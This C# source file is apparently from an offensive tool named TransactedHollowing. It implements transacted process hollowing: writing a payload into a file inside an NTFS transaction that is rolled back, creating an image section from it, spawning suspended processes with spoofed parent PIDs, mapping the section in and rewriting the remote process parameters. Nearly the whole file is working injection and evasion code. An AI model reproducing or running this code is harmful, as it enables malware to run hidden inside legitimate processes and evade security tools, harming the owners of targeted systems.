using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using TransactedHollowing.Interop;

namespace TransactedHollowing.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;

    internal class Utilities
    {
        public static bool CreateInitialProcess(
            string commandLine,
            int ppid,
            bool isBlocing,
            string windowTitle,
            out IntPtr hProcess,
            out IntPtr hThread)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr hParent;
            IntPtr pLocalEnvironment;
            OBJECT_ATTRIBUTES objectAttributes;
            CLIENT_ID clientId;
            PS_CREATE_INFO createInfo;
            PS_ATTRIBUTE_LIST attributeList;
            int nAttributeCount;
            int attributeIndex;
            string imagePathName;
            string ntImagePathName;
            UNICODE_STRING unicodeImagePathName;
            UNICODE_STRING currentDirectory;
            IntPtr pPolicyBuffer = IntPtr.Zero;
            var desktopInfo = new UNICODE_STRING(@"WinSta0\Default");
            var unicodeCommandLine = new UNICODE_STRING(commandLine);
            var unicodeWindowTitle = new UNICODE_STRING(windowTitle);
            hProcess = IntPtr.Zero;
            hThread = IntPtr.Zero;

            imagePathName = Helpers.ResolveImagePathName(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve image path name from command line.");

                return false;
            }
            else
            {
                ntImagePathName = string.Format(@"\??\{0}", imagePathName);
                unicodeImagePathName = new UNICODE_STRING(ntImagePathName);
                currentDirectory = new UNICODE_STRING(Environment.CurrentDirectory);
            }

            pLocalEnvironment = Helpers.GetCurrentEnvironmentAddress();

            if (pLocalEnvironment == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get environment pointer.");

                return false;
            }

            ntstatus = NativeMethods.RtlCreateProcessParametersEx(
                    out IntPtr pProcessParameters,
                    in unicodeImagePathName,
                    IntPtr.Zero,
                    in currentDirectory,
                    in unicodeCommandLine,
                    pLocalEnvironment,
                    in unicodeWindowTitle,
                    in desktopInfo,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create process parameters.");
          
                return false;
            }

            if (ppid > 0)
            {
                objectAttributes = new OBJECT_ATTRIBUTES();
                clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };

                ntstatus = NativeMethods.NtOpenProcess(
                    out hParent,
                    ACCESS_MASK.PROCESS_CREATE_PROCESS,
                    in objectAttributes,
                    in clientId);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[!] Failed to open parent process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    hParent = new IntPtr(-1);
                }
            }
            else
            {
                hParent = new IntPtr(-1);
            }

            createInfo = new PS_CREATE_INFO
            {
                Size = new SIZE_T((uint)Marshal.SizeOf(typeof(PS_CREATE_INFO))),
                State = PS_CREATE_STATE.PsCreateInitialState
            };

            if ((hParent != new IntPtr(-1)) && isBlocing)
                nAttributeCount = 3;
            else if (hParent != new IntPtr(-1))
                nAttributeCount = 2;
            else if (isBlocing)
                nAttributeCount = 2;
            else
                nAttributeCount = 1;

            attributeList = new PS_ATTRIBUTE_LIST(nAttributeCount);
            attributeIndex = 0;
            attributeList.Attributes[attributeIndex].Attribute = PS_ATTRIBUTE_VALUES.PS_ATTRIBUTE_IMAGE_NAME;
            attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)unicodeImagePathName.Length);
            attributeList.Attributes[attributeIndex].Value = unicodeImagePathName.GetBuffer();

            if (hParent != new IntPtr(-1))
            {
                attributeIndex++;
                attributeList.Attributes[attributeIndex].Attribute = PS_ATTRIBUTE_VALUES.PS_ATTRIBUTE_PARENT_PROCESS;
                attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)IntPtr.Size);
                attributeList.Attributes[attributeIndex].Value = hParent;
            }

            if (isBlocing)
            {
                pPolicyBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
                Marshal.WriteInt64(pPolicyBuffer, (long)PROCESS_CREATION_MITIGATION_POLICY.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

                attributeIndex++;
                attributeList.Attributes[attributeIndex].Attribute = PS_ATTRIBUTE_VALUES.PS_ATTRIBUTE_MITIGATION_OPTIONS;
                attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)Marshal.SizeOf(typeof(ulong)));
                attributeList.Attributes[attributeIndex].Value = pPolicyBuffer;
            }

            ntstatus = NativeMethods.NtCreateUserProcess(
                out hProcess,
                out hThread,
                ACCESS_MASK.MAXIMUM_ALLOWED,
                ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                IntPtr.Zero,
                PROCESS_CREATION_FLAGS.SUSPENDED,
                THREAD_CREATION_FLAGS.CREATE_SUSPENDED,
                pProcessParameters,
                ref createInfo,
                ref attributeList);
            NativeMethods.RtlDestroyProcessParameters(pProcessParameters);
            status = (ntstatus == Win32Consts.STATUS_SUCCESS);

            if (pPolicyBuffer != IntPtr.Zero)
                Marshal.FreeHGlobal(pPolicyBuffer);

            if (hParent != new IntPtr(-1))
                NativeMethods.NtClose(hParent);

            if (!status)
            {
                Console.WriteLine("[-] Failed to create suspended process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
            }

            return status;
        }


        public static IntPtr CreateSuspendedProcess(string imagePathName, int ppid)
        {
            NTSTATUS ntstatus;
            IntPtr hParent;
            CLIENT_ID clientId;
            string ntFilePath = string.Format(@"\??\{0}", imagePathName);
            var objectAttributes = new OBJECT_ATTRIBUTES(
                ntFilePath,
                OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE);
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(
                Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));

            ntstatus = NativeMethods.NtOpenFile(
                out IntPtr hImageFile,
                ACCESS_MASK.FILE_READ_DATA | ACCESS_MASK.FILE_EXECUTE | ACCESS_MASK.FILE_READ_ATTRIBUTES | ACCESS_MASK.SYNCHRONIZE,
                in objectAttributes,
                pIoStatusBlock,
                FILE_SHARE_ACCESS.READ | FILE_SHARE_ACCESS.DELETE,
                FILE_OPEN_OPTIONS.SYNCHRONOUS_IO_NONALERT | FILE_OPEN_OPTIONS.NON_DIRECTORY_FILE);
            Marshal.FreeHGlobal(pIoStatusBlock);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to open \"{0}\".", ntFilePath);
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }

            ntstatus = NativeMethods.NtCreateSection(
                out IntPtr hSection,
                ACCESS_MASK.SECTION_ALL_ACCESS,
                IntPtr.Zero,
                IntPtr.Zero,
                SECTION_PROTECTIONS.PAGE_READONLY,
                SECTION_ATTRIBUTES.SEC_IMAGE,
                hImageFile);
            NativeMethods.NtClose(hImageFile);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create section.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }

            if (ppid > 0)
            {
                objectAttributes = new OBJECT_ATTRIBUTES();
                clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };

                ntstatus = NativeMethods.NtOpenProcess(
                    out hParent,
                    ACCESS_MASK.PROCESS_CREATE_PROCESS,
                    in objectAttributes,
                    in clientId);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[!] Failed to open parent process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    hParent = new IntPtr(-1);
                }
            }
            else
            {
                hParent = new IntPtr(-1);
            }

            ntstatus = NativeMethods.NtCreateProcessEx(
                out IntPtr hSuspendedProcess,
                ACCESS_MASK.PROCESS_ALL_ACCESS,
                IntPtr.Zero,
                hParent,
                NT_PROCESS_CREATION_FLAGS.INHERIT_HANDLES,
                hSection,
                IntPtr.Zero,
                IntPtr.Zero,
                BOOLEAN.FALSE);
            NativeMethods.NtClose(hSection);

            if (hParent != new IntPtr(-1))
                NativeMethods.NtClose(hParent);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create suspended process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }

            return hSuspendedProcess;
        }


        public static IntPtr CreateTransactedSection(
            string transactedFilePath,
            byte[] payload)
        {
            NTSTATUS ntstatus;
            int error;
            IntPtr hTransactedFile;
            IntPtr pIoStatusBlock;
            int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));

            ntstatus = NativeMethods.NtCreateTransaction(
                out IntPtr hTransaction,
                ACCESS_MASK.TRANSACTION_ALL_ACCESS,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                0,
                IntPtr.Zero,
                IntPtr.Zero);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create transaction.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            hTransactedFile = NativeMethods.CreateFileTransacted(
                transactedFilePath,
                ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                0,
                IntPtr.Zero,
                FILE_CREATE_DISPOSITION.CREATE_ALWAYS,
                FILE_ATTRIBUTES.NORMAL,
                IntPtr.Zero,
                hTransaction,
                IntPtr.Zero,
                IntPtr.Zero);

            if (hTransactedFile == Win32Consts.INVALID_HANDLE_VALUE)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to create transacted file.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                NativeMethods.NtClose(hTransaction);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
            Helpers.ZeroMemory(pIoStatusBlock, nSizeIoStatusBlock);

            ntstatus = NativeMethods.NtWriteFile(
                hTransactedFile,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                pIoStatusBlock,
                payload,
                (uint)payload.Length,
                IntPtr.Zero,
                IntPtr.Zero);
            Marshal.FreeHGlobal(pIoStatusBlock);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to write payload in the transacted file.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                NativeMethods.NtClose(hTransactedFile);
                NativeMethods.NtClose(hTransaction);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            ntstatus = NativeMethods.NtCreateSection(
                out IntPtr hTransactedSection,
                ACCESS_MASK.SECTION_ALL_ACCESS,
                IntPtr.Zero,
                IntPtr.Zero,
                SECTION_PROTECTIONS.PAGE_READONLY,
                SECTION_ATTRIBUTES.SEC_IMAGE,
                hTransactedFile);
            NativeMethods.NtClose(hTransactedFile);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create section.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            ntstatus = NativeMethods.NtRollbackTransaction(hTransaction, BOOLEAN.TRUE);
            NativeMethods.NtClose(hTransaction);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to rollback transaction.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                NativeMethods.NtClose(hTransactedSection);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            return hTransactedSection;
        }


        public static IntPtr MapSectionToProcess(
            IntPtr hProcess,
            IntPtr hSection)
        {
            NTSTATUS ntstatus;
            var pSectionBaseAddress = IntPtr.Zero;
            var ViewSize = SIZE_T.Zero;

            ntstatus = NativeMethods.NtMapViewOfSection(
                hSection,
                hProcess,
                ref pSectionBaseAddress,
                UIntPtr.Zero,
                SIZE_T.Zero,
                IntPtr.Zero,
                ref ViewSize,
                SECTION_INHERIT.ViewShare,
                0,
                MEMORY_PROTECTION.READONLY);

            if ((ntstatus != Win32Consts.STATUS_SUCCESS) &&
                (ntstatus != Win32Consts.STATUS_IMAGE_NOT_AT_BASE))
            {
                Console.WriteLine("[-] Failed to map section to target process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }
            else if (ntstatus == Win32Consts.STATUS_IMAGE_NOT_AT_BASE)
            {
                Console.WriteLine("[!] Image section is relocated.");
            }

            return pSectionBaseAddress;
        }


        public static void RebaseProcessParameters(
            IntPtr pLocalProcessParameters,
            IntPtr pRemoteProcessParameters,
            bool toLocalPointers,
            bool containsEnvironment)
        {
            ulong nBaseOffset;
            IntPtr pBasePointer;
            IntPtr pTempPointer;
            IntPtr pVerify;
            IntPtr pOverwrite;
            var processParameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(
                pLocalProcessParameters,
                typeof(RTL_USER_PROCESS_PARAMETERS));
            ulong nSizeStructure = (ulong)processParameters.MaximumLength;
            ulong nDataSize = nSizeStructure;

            if (containsEnvironment)
                nDataSize += processParameters.EnvironmentSize;

            if (toLocalPointers)
            {
                pBasePointer = pRemoteProcessParameters;
                nBaseOffset = (ulong)(pLocalProcessParameters.ToInt64() - pRemoteProcessParameters.ToInt64());
            }
            else
            {
                pBasePointer = pLocalProcessParameters;
                nBaseOffset = (ulong)(pRemoteProcessParameters.ToInt64() - pLocalProcessParameters.ToInt64());
            }

            for (int nPosition = 0; nPosition < (int)nSizeStructure; nPosition += IntPtr.Size)
            {
                pTempPointer = new IntPtr(pLocalProcessParameters.ToInt64() + nPosition);
                pVerify = Marshal.ReadIntPtr(pTempPointer);

                if ((ulong)(pVerify.ToInt64() - pBasePointer.ToInt64()) < nDataSize)
                {
                    pOverwrite = new IntPtr(pVerify.ToInt64() + (long)nBaseOffset);
                    Marshal.WriteIntPtr(pTempPointer, pOverwrite);
                }
            }
        }


        public static IntPtr SetProcessParameters(
            IntPtr hProcess,
            string imagePathName,
            string commandLine,
            string currentDirectory,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr pPeb;
            IntPtr pLocalEnvironment;
            IntPtr pRemoteProcessParametersPointer;
            IntPtr pRemoteProcessParameters;
            IntPtr pDataBuffer;
            int nSizeParameters;
            int nSizeEnvironment;
            int nSizeBuffer;
            int nOffsetProcessParameters;
            int nOffsetEnvironmentSize;
            int nPageOffset;
            string winDir = Environment.GetEnvironmentVariable("windir");
            var unicodeImagePathName = new UNICODE_STRING(imagePathName);
            var unicodeCommandline = new UNICODE_STRING(commandLine);
            var unicodeCurrentDirectory = new UNICODE_STRING(currentDirectory);
            var unicodeWindowTitle = new UNICODE_STRING(windowTitle);
            var dllPath = new UNICODE_STRING(string.Format(@"{0}\System32", winDir));
            var desktopInfo = new UNICODE_STRING(@"WinSta0\Default");

            pPeb = Helpers.GetPebAddress(hProcess);

            if (pPeb == IntPtr.Zero)
                return IntPtr.Zero;

            nOffsetEnvironmentSize = Marshal.OffsetOf(
                    typeof(RTL_USER_PROCESS_PARAMETERS),
                    "EnvironmentSize").ToInt32();

            if (IntPtr.Size == 4)
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB32_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt32() + nOffsetProcessParameters);
            }
            else
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB64_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt64() + nOffsetProcessParameters);
            }

            pLocalEnvironment = Helpers.GetCurrentEnvironmentAddress();

            if (pLocalEnvironment == IntPtr.Zero)
                return IntPtr.Zero;

            ntstatus = NativeMethods.RtlCreateProcessParametersEx(
                    out IntPtr pLocalProcessParameters,
                    in unicodeImagePathName,
                    in dllPath,
                    in unicodeCurrentDirectory,
                    in unicodeCommandline,
                    pLocalEnvironment,
                    in unicodeWindowTitle,
                    in desktopInfo,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
                return IntPtr.Zero;

            nPageOffset = (int)(pLocalProcessParameters.ToInt64() - (pLocalProcessParameters.ToInt64() & ~(0xFFF)));
            nSizeParameters = Marshal.ReadInt32(pLocalProcessParameters); // MaxLength
            nSizeEnvironment = (int)Marshal.ReadInt64(new IntPtr(
                pLocalProcessParameters.ToInt64() +
                nOffsetEnvironmentSize));
            nSizeBuffer = nSizeParameters + nSizeEnvironment;

            pRemoteProcessParameters = Helpers.AllocateReadWriteMemory(
                hProcess,
                IntPtr.Zero,
                (uint)(nSizeBuffer + 0x1000));

            if (pRemoteProcessParameters == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory.");

                return IntPtr.Zero;
            }

            pRemoteProcessParameters = new IntPtr(pRemoteProcessParameters.ToInt64() + nPageOffset);

            RebaseProcessParameters(
                pLocalProcessParameters,
                pRemoteProcessParameters,
                false,
                true);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParameters,
                pLocalProcessParameters,
                (uint)nSizeBuffer);
            NativeMethods.RtlDestroyProcessParameters(pLocalProcessParameters);

            if (!status)
            {
                Console.WriteLine("[-] Failed to write process parameters.");

                return IntPtr.Zero;
            }

            pDataBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pDataBuffer, pRemoteProcessParameters);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParametersPointer,
                pDataBuffer,
                (uint)IntPtr.Size);

            Marshal.FreeHGlobal(pDataBuffer);

            if (!status)
                return IntPtr.Zero;

            return pRemoteProcessParameters;
        }
    }
}
